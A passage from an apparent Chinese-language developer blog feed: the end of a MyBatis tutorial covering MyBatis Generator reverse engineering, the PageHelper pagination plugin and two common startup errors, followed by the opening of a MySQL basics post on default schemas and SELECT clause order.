</table>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%8F%92%E4%BB%B6%E5%B7%A5%E5%85%B7">&#x63D2;&#x4EF6;&#x5DE5;&#x5177;</h2>
<h3 id="mbg-mybatis-generator-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B">MBG MyBatis Generator &#x9006;&#x5411;&#x5DE5;&#x7A0B;</h3>
<p>&#x6B63;&#x5411;&#x5DE5;&#x7A0B;&#x662F;&#x5148;&#x521B;&#x5EFA;&#x5B9E;&#x4F53;&#x7C7B;&#xFF0C;&#x518D;&#x7531;&#x6846;&#x67B6;&#x6839;&#x636E;&#x5B9E;&#x4F53;&#x7C7B;&#x751F;&#x6210;&#x6570;&#x636E;&#x5E93;&#x8868;&#x3002;&#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x662F;&#x5148;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x8868;&#xFF0C;&#x518D;&#x7531;&#x6846;&#x67B6;&#x6839;&#x636E;&#x6570;&#x636E;&#x5E93;&#x8868;&#x53CD;&#x5411;&#x751F;&#x6210; Java &#x5B9E;&#x4F53;&#x7C7B;&#x3001;Mapper &#x63A5;&#x53E3;&#x3001;Mapper &#x6620;&#x5C04;&#x6587;&#x4EF6;&#x3002;</p>
<ul>
<li>&#x4F9D;&#x8D56;&#x548C;&#x63D2;&#x4EF6;</li>
</ul>
<pre><code class="language-xml">...
&lt;packaging&gt;jar&lt;/packaging&gt;
...
&lt;dependencies&gt;
    &lt;!-- MyBatis&#x6838;&#x5FC3;&#x4F9D;&#x8D56;&#x5305; --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
        &lt;version&gt;3.5.9&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!-- junit&#x6D4B;&#x8BD5; --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;junit&lt;/groupId&gt;
        &lt;artifactId&gt;junit&lt;/artifactId&gt;
        &lt;version&gt;4.13.2&lt;/version&gt;
        &lt;scope&gt;test&lt;/scope&gt;
    &lt;/dependency&gt;
    &lt;!-- MySQL&#x9A71;&#x52A8; --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;mysql&lt;/groupId&gt;
        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
        &lt;version&gt;8.0.27&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!-- log4j&#x65E5;&#x5FD7; --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;log4j&lt;/groupId&gt;
        &lt;artifactId&gt;log4j&lt;/artifactId&gt;
        &lt;version&gt;1.2.17&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;
&lt;!-- &#x63A7;&#x5236;Maven&#x5728;&#x6784;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x76F8;&#x5173;&#x914D;&#x7F6E; --&gt;
&lt;build&gt;
    &lt;!-- &#x6784;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x63D2;&#x4EF6; --&gt;
    &lt;plugins&gt;
        &lt;!-- &#x5177;&#x4F53;&#x63D2;&#x4EF6;&#xFF0C;&#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x7684;&#x64CD;&#x4F5C;&#x662F;&#x4EE5;&#x6784;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x63D2;&#x4EF6;&#x5F62;&#x5F0F;&#x51FA;&#x73B0;&#x7684; --&gt;
        &lt;plugin&gt;
            &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt;
            &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt;
            &lt;version&gt;1.3.0&lt;/version&gt;
            &lt;!-- &#x63D2;&#x4EF6;&#x7684;&#x4F9D;&#x8D56; --&gt;
            &lt;dependencies&gt;
                &lt;!-- &#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x7684;&#x6838;&#x5FC3;&#x4F9D;&#x8D56; --&gt;
                &lt;dependency&gt;
                    &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt;
                    &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt;
                    &lt;version&gt;1.3.2&lt;/version&gt;
                &lt;/dependency&gt;
                &lt;!-- &#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60; --&gt;
                &lt;dependency&gt;
                    &lt;groupId&gt;com.mchange&lt;/groupId&gt;
                    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;
                    &lt;version&gt;0.9.2&lt;/version&gt;
                &lt;/dependency&gt;
                &lt;!-- MySQL&#x9A71;&#x52A8; --&gt;
                &lt;dependency&gt;
                    &lt;groupId&gt;mysql&lt;/groupId&gt;
                    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
                    &lt;version&gt;8.0.27&lt;/version&gt;
                &lt;/dependency&gt;
            &lt;/dependencies&gt;
        &lt;/plugin&gt;
    &lt;/plugins&gt;
&lt;/build&gt;
</code></pre>
<ul>
<li>&#x914D;&#x7F6E;&#x6587;&#x4EF6;</li>
</ul>
<p>MBG &#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x5176;&#x5B9E;&#x4E0E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5173;&#x7CFB;&#x4E0D;&#x5927;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x642D;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x73AF;&#x5883;&#x3002;mybatis-config.xml &#x4E0E; log4j.xml &#x914D;&#x7F6E;&#x540C;&#x4E0A;&#x3002;</p>
<pre><code class="language-xml">&lt;!-- jdbc.properties --&gt;
jdbc.driver=com.mysql.cj.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/MyBatis?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=UTF-8
jdbc.username=&lt;username&gt;
jdbc.password=&lt;password&gt;
</code></pre>
<pre><code class="language-xml">&lt;!-- &#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x914D;&#x7F6E;&#x6587;&#x4EF6; =&gt; generatorConfig.xml --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE generatorConfiguration
        PUBLIC &quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;&gt;
&lt;generatorConfiguration&gt;
    &lt;!--
    targetRuntime =&gt; &#x6267;&#x884C;&#x751F;&#x6210;&#x7684;&#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x7684;&#x7248;&#x672C;
    MyBatis3Simple =&gt; &#x751F;&#x6210;&#x57FA;&#x672C;&#x7684; CRUD
    MyBatis3 =&gt; &#x751F;&#x6210;&#x5E26;&#x6761;&#x4EF6;&#x7684; CRUD
    --&gt;
    &lt;context id=&quot;DB2Tables&quot; targetRuntime=&quot;MyBatis3&quot;&gt;
        &lt;!-- &#x6570;&#x636E;&#x5E93;&#x7684;&#x8FDE;&#x63A5;&#x4FE1;&#x606F; =&gt; &#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x8868; --&gt;
        &lt;jdbcConnection driverClass=&quot;com.mysql.cj.jdbc.Driver&quot;
                        connectionURL=&quot;jdbc:mysql://localhost:3306/mybatis&quot;
                        userId=&quot;&lt;username&gt;&quot;
                        password=&quot;&lt;password&gt;&quot;&gt;
        &lt;/jdbcConnection&gt;
        &lt;!-- javaBean &#x7684;&#x751F;&#x6210;&#x7B56;&#x7565;--&gt;
        &lt;javaModelGenerator targetPackage=&quot;com.zszy.mybatis.pojo&quot; targetProject=&quot;./src/main/java&quot;&gt;
            &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot; /&gt;
            &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot; /&gt;
        &lt;/javaModelGenerator&gt;
        &lt;!-- SQL &#x6620;&#x5C04;&#x6587;&#x4EF6;&#x7684;&#x751F;&#x6210;&#x7B56;&#x7565; --&gt;
        &lt;sqlMapGenerator targetPackage=&quot;com.zszy.mybatis.mapper&quot; targetProject=&quot;./src/main/resources&quot;&gt;
            &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot; /&gt;
        &lt;/sqlMapGenerator&gt;
        &lt;!-- Mapper &#x63A5;&#x53E3;&#x7684;&#x751F;&#x6210;&#x7B56;&#x7565; --&gt;
        &lt;javaClientGenerator type=&quot;XMLMAPPER&quot; targetPackage=&quot;com.zszy.mybatis.mapper&quot; targetProject=&quot;./src/main/java&quot;&gt;
            &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot; /&gt;
        &lt;/javaClientGenerator&gt;
        &lt;!-- &#x9006;&#x5411;&#x5206;&#x6790;&#x7684;&#x8868; --&gt;
        &lt;!-- tableName&#x8BBE;&#x7F6E;&#x4E3A;*&#x53F7; =&gt; &#x5BF9;&#x5E94;&#x6240;&#x6709;&#x8868; =&gt; &#x6B64;&#x65F6;&#x4E0D;&#x5199; domainObjectName --&gt;
        &lt;!-- domainObjectName &#x5C5E;&#x6027;&#x6307;&#x5B9A;&#x751F;&#x6210;&#x51FA;&#x6765;&#x7684;&#x5B9E;&#x4F53;&#x7C7B;&#x7684;&#x7C7B;&#x540D; --&gt;
        &lt;table tableName=&quot;t_emp&quot; domainObjectName=&quot;Emp&quot;/&gt;
        &lt;table tableName=&quot;t_dept&quot; domainObjectName=&quot;Dept&quot;/&gt;
    &lt;/context&gt;
&lt;/generatorConfiguration&gt;
</code></pre>
<ul>
<li>&#x9006;&#x5411;&#x64CD;&#x4F5C;</li>
</ul>
<p>&#x6267;&#x884C; Maven &#x4E2D; MBG &#x63D2;&#x4EF6;&#x7684; mybatis-generator:generate&#x3002;</p>
<pre><code class="language-java">public class MBGTest {
    @Test
    public void testMBG(){
        try {
            InputStream is = Resources.getResourceAsStream(&quot;mybatis-config.xml&quot;);
            SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);
            SqlSession sqlSession = sqlSessionFactory.openSession(true);
            EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);
            // &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x6570;&#x636E;
//            List&lt;Emp&gt; list = mapper.selectByExample(null);
//            list.forEach(emp -&gt; System.out.println(emp));
            // &#x6839;&#x636E;&#x6761;&#x4EF6;&#x67E5;&#x8BE2;
//            EmpExample example = new EmpExample();
            // QBC &#x98CE;&#x683C; =&gt; query by Criteria 
//            example.createCriteria().andEmpNameEqualTo(&quot;zs&quot;).andAgeGreaterThan(20);
//            example.or().andDidIsNotNull();
//            List&lt;Emp&gt; list = mapper.selectByExample(example);
//            list.forEach(emp -&gt; System.out.println(emp));
            // &#x4FEE;&#x6539; =&gt; updateByPrimaryKeySelective =&gt; &#x67D0;&#x4E2A;&#x5C5E;&#x6027;&#x4E3A; null &#x5219;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x5728;&#x4FEE;&#x6539;&#x5217;&#x8868;&#x4E2D;
            mapper.updateByPrimaryKeySelective(new Emp(10,&quot;testMBG&quot;,22,&quot;&#x5973;&quot;,&quot;testMBG@mail.com&quot;,3));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
</code></pre>
<h3 id="%E5%88%86%E9%A1%B5%E6%8F%92%E4%BB%B6">&#x5206;&#x9875;&#x63D2;&#x4EF6;</h3>
<ul>
<li>&#x6DFB;&#x52A0;&#x4F9D;&#x8D56;</li>
</ul>
<pre><code class="language-xml">&lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper --&gt;
&lt;dependency&gt;
	&lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;
	&lt;artifactId&gt;pagehelper&lt;/artifactId&gt;
	&lt;version&gt;5.2.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>mybatis-config.xml &#x914D;&#x7F6E;&#x5206;&#x9875;&#x63D2;&#x4EF6;</li>
</ul>
<pre><code class="language-xml">...
&lt;plugins&gt;
    &lt;!-- &#x8BBE;&#x7F6E;&#x5206;&#x9875;&#x63D2;&#x4EF6; --&gt;
    &lt;plugin interceptor=&quot;com.github.pagehelper.PageInterceptor&quot;&gt;&lt;/plugin&gt;
&lt;/plugins&gt;
</code></pre>
<ul>
<li>&#x5F00;&#x542F;&#x5206;&#x9875;&#x529F;&#x80FD;</li>
</ul>
<p>&#x5728;&#x67E5;&#x8BE2;&#x529F;&#x80FD;&#x4E4B;&#x524D;&#x4F7F;&#x7528; <code>PageHelper.startPage(int pageNum, int pageSize)</code> &#x5F00;&#x542F;&#x5206;&#x9875;&#x529F;&#x80FD;&#xFF0C;pageNum &#x8868;&#x793A;&#x5F53;&#x524D;&#x9875;&#x7684;&#x9875;&#x7801;&#xFF0C;pageSize &#x8868;&#x793A;&#x6BCF;&#x9875;&#x663E;&#x793A;&#x7684;&#x6761;&#x6570;&#x3002;</p>
<pre><code class="language-java">public class PageHelperTest {
    @Test
    public void testPageHelper(){
        /*
        index =&gt; &#x5F53;&#x524D;&#x9875;&#x7684;&#x8D77;&#x59CB;&#x7D22;&#x5F15;
        pageSize =&gt; &#x6BCF;&#x9875;&#x663E;&#x793A;&#x6761;&#x6570;
        pageNum =&gt; &#x5F53;&#x524D;&#x9875;&#x7684;&#x9875;&#x7801;
        index = (pageNum-1)*pageSize
         */
        // &#x67E5;&#x8BE2;&#x529F;&#x80FD;&#x524D;&#x5F00;&#x542F;&#x5206;&#x9875;;&#x67E5;&#x8BE2;&#x529F;&#x80FD;&#x4E4B;&#x540E;&#x83B7;&#x53D6;&#x5206;&#x9875;&#x76F8;&#x5173;&#x4FE1;&#x606F;
        InputStream is = null;
        try {
            is = Resources.getResourceAsStream(&quot;mybatis-config.xml&quot;);
            SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);
            SqlSession sqlSession = sqlSessionFactory.openSession(true);
            EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);
            // Page&lt;Object&gt; page = PageHelper.startPage(1, 4);
            PageHelper.startPage(1, 4);
            List&lt;Emp&gt; list = mapper.selectByExample(null);
//            list.forEach(emp -&gt; System.out.println(emp));
            // PageInfo &#x5E38;&#x5E94;&#x7528;&#x4E8E;&#x5C45;&#x4E2D;&#x9875;&#x9762;&#x6761;
            PageInfo&lt;Emp&gt; page = new PageInfo&lt;&gt;(list,3);
            System.out.println(page);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="bugs-%E8%A7%A3%E5%86%B3">Bugs &#x89E3;&#x51B3;</h2>
<ul>
<li>BeanCreationException =&gt; Error creating bean with name &apos;sqlSessionFactory&apos;</li>
</ul>
<pre><code class="language-java">// .../logs/iamericanoLogs
// &#x65E5;&#x5FD7;&#x76F4;&#x63A5;&#x770B;&#x65F6;&#x95F4;&#x9996;&#x6BB5;
00:00:00.000 [RMI TCP Connection(5)-127.0.0.1] ERROR o.s.w.c.ContextLoader - [initWebApplicationContext,313] - Context initialization failed
org.springframework.beans.factory.BeanCreationException: Error creating bean with name &apos;sqlSessionFactory&apos; defined in class path resource [application.xml]: Initialization of bean failed; nested exception is org.springframework.beans.TypeMismatchException: Failed to convert property value of type &apos;java.lang.String&apos; to required type &apos;org.springframework.core.io.Resource[]&apos; for property &apos;mapperLocations&apos;; nested exception is java.lang.IllegalArgumentException: Could not resolve resource location pattern [classpath:mapper/**/*.xml]: class path resource [mapper/] cannot be resolved to URL because it does not exist
// &#x89E3;&#x51B3;&#x7684;&#x62A5;&#x9519; =&gt; &#x56E0;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x800C;&#x5BFC;&#x81F4;&#x7684;&#x526F;&#x4F5C;&#x7528;
// 23-Jun-2020 21:46:22.000 SEVERE [RMI TCP Connection(5)-127.0.0.1] org.apache.catalina.core.StandardContext.startInternal One or more listeners failed to start. Full details will be found in the appropriate container log file
// 23-Jun-2020 21:46:22.000 SEVERE [RMI TCP Connection(5)-127.0.0.1] org.apache.catalina.core.StandardContext.startInternal Context [/admin] startup failed due to previous errors
</code></pre>
<p>&apos;sqlSessionFactory&apos; Bean &#x521B;&#x5EFA;&#x5931;&#x8D25;&#x6307;&#x5411;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x7684;&#x7F3A;&#x5931;&#xFF0C;&#x5728;&#x642D;&#x5EFA;&#x9879;&#x76EE;&#x521D;&#x671F;&#x51FA;&#x73B0;&#x6B64;&#x95EE;&#x9898;&#x65F6;&#x53EF;&#x5148;&#x6CE8;&#x91CA;&#x6389;&#x5C5E;&#x6027; mapperLocations &#x7684;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x542F;&#x52A8;&#x3002;</p>
<p>&#x4E3B;&#x8981;&#x6CE8;&#x610F;&#x70B9;&#x662F; mapper &#x76EE;&#x5F55;&#x4E0B;&#x76F8;&#x5173;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x4EE5;&#x53CA;&#x56E0;&#x6B64;&#x539F;&#x56E0;&#x5BFC;&#x81F4;&#x7684;&#x5916;&#x5C42;&#x62A5;&#x9519; startInternal One or more listeners failed to start&#x3002;</p>
<pre><code class="language-xml">&lt;!-- application.xml --&gt;
...
&lt;!-- &#x6574;&#x5408;&#x56F4;&#x7ED5; sqlSessionFactory --&gt;
&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;
    ...
    &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:mapper/**/*.xml&quot;/&gt;
&lt;/bean&gt;
</code></pre>
<ul>
<li>BindingException =&gt; Invalid bound statement (not found)</li>
</ul>
<pre><code class="language-java">org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.zszy.dao.IamericanoUserDao.queryById
</code></pre>
<p>EasyCode &#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x751F;&#x6210; resources/mapper &#x4E0B;&#x7684; xxxMapper.xml &#x6587;&#x4EF6;&#x65F6;&#x5931;&#x6548;&#x3002;&#x6CA1;&#x6709;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x90A3;&#x4E48;&#x5FC5;&#x7136;&#x4F1A;&#x7ED1;&#x5B9A;&#x5931;&#x8D25;&#x3002;</p>
<!--kg-card-end: markdown--><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://mybatis.org/mybatis-3/zh/index.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">mybatis &#x2013; MyBatis 3 | &#x7B80;&#x4ECB;</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">&#x7B80;&#x4ECB;</span><span class="kg-bookmark-publisher">Clinton Begin</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://mybatis.org/images/mybatis-logo.png" alt="MyBatis"></div></a></figure><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[MySQL 笔记]]></title><description><![CDATA[MYSQL 基础篇]]></description><link>yourdomain.com/mysqlnote/</link><guid isPermaLink="false">6264edb6aa2820757fbb143e</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Wed, 22 Dec 2021 13:11:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/04/cloud.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<img src="yourdomain.com/content/images/2022/04/cloud.jpg" alt="MySQL &#x7B14;&#x8BB0;"><p>&#x6570;&#x636E;&#x5E93;&#x662F;&#x6709;&#x7EC4;&#x7EC7;&#x7684;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x3002;&#x8868;&#x662F;&#x5B58;&#x50A8;&#x7279;&#x5B9A;&#x7C7B;&#x578B;&#x6570;&#x636E;&#x7684;&#x7ED3;&#x6784;&#x5316;&#x6587;&#x4EF6;&#x3002;&#x6A21;&#x5F0F;&#x8BF4;&#x660E;&#x5E93;&#x4E0E;&#x8868;&#x7684;&#x5E03;&#x5C40;&#x4E0E;&#x7279;&#x6027;&#x4FE1;&#x606F;&#x3002;&#x5217;&#x662F;&#x8868;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x6240;&#x6709;&#x8868;&#x90FD;&#x7531;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x5217;&#x7EC4;&#x6210;&#x3002;&#x884C;&#x4F5C;&#x4E3A;&#x8868;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x8BB0;&#x5F55;&#x3002;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x8868;&#x4E2D;&#x6BCF;&#x884C;&#x7684;&#x8FD9;&#x4E2A;&#x5217;&#x6216;&#x8FD9;&#x7EC4;&#x5217;&#xFF0C;&#x79F0;&#x4E3A;&#x4E3B;&#x952E;&#x3002;&#x6CA1;&#x6709;&#x4E3B;&#x952E;&#x5219;&#x65E0;&#x6CD5;&#x5B89;&#x5168;&#x66F4;&#x65B0;&#x6216;&#x5220;&#x9664;&#x8868;&#x4E2D;&#x7684;&#x7279;&#x5B9A;&#x884C;&#x3002;&#x4EFB;&#x4F55;&#x5217;&#x90FD;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x4E3B;&#x952E;&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x6EE1;&#x8DB3;&#x4EFB;&#x610F;&#x4E24;&#x884C;&#x90FD;&#x4E0D;&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x4E3B;&#x952E;&#x503C;&#x4E14;&#x6BCF;&#x884C;&#x90FD;&#x5FC5;&#x987B;&#x5177;&#x6709;&#x4E00;&#x4E2A;&#x975E; NULL &#x7684;&#x4E3B;&#x952E;&#x503C;&#x7684;&#x6761;&#x4EF6;&#x3002;</p>
<h3 id="%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93">&#x9ED8;&#x8BA4;&#x6570;&#x636E;&#x5E93;</h3>
<table>
    <thead>
        <tr>
            <th>&#x6570;&#x636E;&#x5E93;</th><th>
            </th><th>&#x63CF;&#x8FF0;</th><th>
        </th>
    </tr></thead>
    <tbody>
        <tr>
            <td>infomation_schema</td><td>
            </td><td>&#x4FE1;&#x606F;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5305;&#x62EC; MySQL &#x5728;&#x7EF4;&#x62A4;&#x7684;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x3001;&#x8868;&#x3001;&#x5217;&#x8BBF;&#x95EE;&#x6743;&#x9650;</td><td>
        </td></tr>
        <tr>
            <td>performance_schema</td><td>
            </td><td>&#x6027;&#x80FD;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x8BB0;&#x5F55; MySQL Server &#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x8D44;&#x6E90;&#x6D88;&#x8017;&#x76F8;&#x5173;&#x4FE1;&#x606F;</td><td>
        </td></tr>
        <tr>
            <td>mysql</td><td>
            </td><td>&#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x8005;&#x7684;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x3001;&#x6743;&#x9650;&#x4FE1;&#x606F;&#x4EE5;&#x53CA;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;</td><td>
        </td></tr>
        <tr>
            <td>sys</td><td>
            </td><td>&#x7B80;&#x6613;&#x7248;&#x7684;performance_schema&#xFF0C;&#x5C06;&#x6027;&#x80FD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x6C47;&#x603B;&#x6210;&#x6613;&#x7406;&#x89E3;&#x5F62;&#x5F0F;</td><td>
        </td></tr>
    </tbody>
</table>
<h3 id="select-%E8%AF%AD%E5%8F%A5%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84">SELECT &#x8BED;&#x53E5;&#x5B8C;&#x6574;&#x7ED3;&#x6784;</h3>
<table>
<thead>
<tr>
<th style="text-align:center">&#x5B50;&#x53E5;</th>
<th style="text-align:center">&#x8BF4;&#x660E;</th>
<th style="text-align:center">&#x662F;&#x5426;&#x5FC5;&#x987B;&#x4F7F;&#x7528;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SELECT</td>
<td style="text-align:center">&#x8981;&#x8FD4;&#x56DE;&#x7684;&#x5217;&#x6216;&#x8005;&#x8868;&#x8FBE;&#x5F0F;</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">FROM</td>
<td style="text-align:center">&#x68C0;&#x7D22;&#x6570;&#x636E;&#x7684;&#x8868;</td>
<td style="text-align:center">&#x4EC5;&#x5728;&#x4ECE;&#x8868;&#x4E2D;&#x9009;&#x62E9;&#x6570;&#x636E;&#x65F6;&#x4F7F;&#x7528;</td>
</tr>
<tr>
<td style="text-align:center">WHERE</td>
<td style="text-align:center">&#x884C;&#x7EA7;&#x8FC7;&#x6EE4;</td>
<td style="text-align:center">N</td>
</tr>
<tr>
<td style="text-align:center">GROUP BY</td>
<td style="text-align:center">&#x5206;&#x7EC4;&#x8BF4;&#x660E;</td>
<td style="text-align:center">&#x4EC5;&#x5728;&#x6309;&#x7EC4;&#x8BA1;&#x7B97;&#x805A;&#x96C6;&#x65F6;&#x4F7F;&#x7528;</td>
</tr>
<tr>
<td style="text-align:center">HAVING</td>
<td style="text-align:center">&#x7EC4;&#x7EA7;&#x8FC7;&#x6EE4;</td>
<td style="text-align:center">N</td>
</tr>
<tr>
<td style="text-align:center">ORDER BY</td>
<td style="text-align:center">&#x8F93;&#x51FA;&#x6392;&#x5E8F;&#x987A;&#x5E8F;</td>
<td style="text-align:center">N</td>
</tr>
<tr>
<td style="text-align:center">LIMIT</td>
<td style="text-align:center">&#x8981;&#x68C0;&#x7D22;&#x7684;&#x884C;&#x6570;</td>
<td style="text-align:center">N</td>
</tr>
</tbody>
</table>
<pre><code class="language-javascript">// sql92
SELECT ...(&#x805A;&#x5408;&#x51FD;&#x6570;) FROM ... WHERE &#x591A;&#x8868;&#x8FDE;&#x63A5;&#x6761;&#x4EF6; AND &#x4E0D;&#x5305;&#x542B;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6; GROUP BY ... HAVING &#x5305;&#x542B;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6; ORDER BY ...(ASC/DESC) LIMIT ...
// sql99
SELECT ...(&#x805A;&#x5408;&#x51FD;&#x6570;) FROM ... (LEFT/RIGHT) JOIN ... ON ... (&#x591A;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;) (LEFT/RIGHT) JOIN ... ON ... (&#x591A;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;) WHERE &#x4E0D;&#x5305;&#x542B;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6; GROUP BY ... HAVING &#x5305;&#x542B;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6; ORDER BY ...(ASC/DESC) LIMIT ...
</code></pre>
<h3 id="sql-%E5%BA%95%E5%B1%82%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86-%E4%BA%A7%E7%94%9F%E4%B8%80%E7%B3%BB%E5%88%97%E8%99%9A%E6%8B%9F%E8%A1%A8">SQL &#x5E95;&#x5C42;&#x6267;&#x884C;&#x539F;&#x7406; =&gt; &#x4EA7;&#x751F;&#x4E00;&#x7CFB;&#x5217;&#x865A;&#x62DF;&#x8868;</h3>
<pre><code class="language-javascript">// FROM &#x9996;&#x5148;&#x52A0;&#x8F7D;&#x3001;SELECT &#x89C6;&#x4F5C;&#x7D22;&#x5F15;&#x9996;&#x4F4D;&#x5904;&#x4E8E;&#x7B2C;&#x4E8C;&#x52A0;&#x8F7D;&#x3001;ORDER BY &#x4E0E; LIMIT &#x770B;&#x4F5C;&#x7D22;&#x5F15;&#x672B;&#x5C3E;&#x6700;&#x540E;&#x52A0;&#x8F7D;
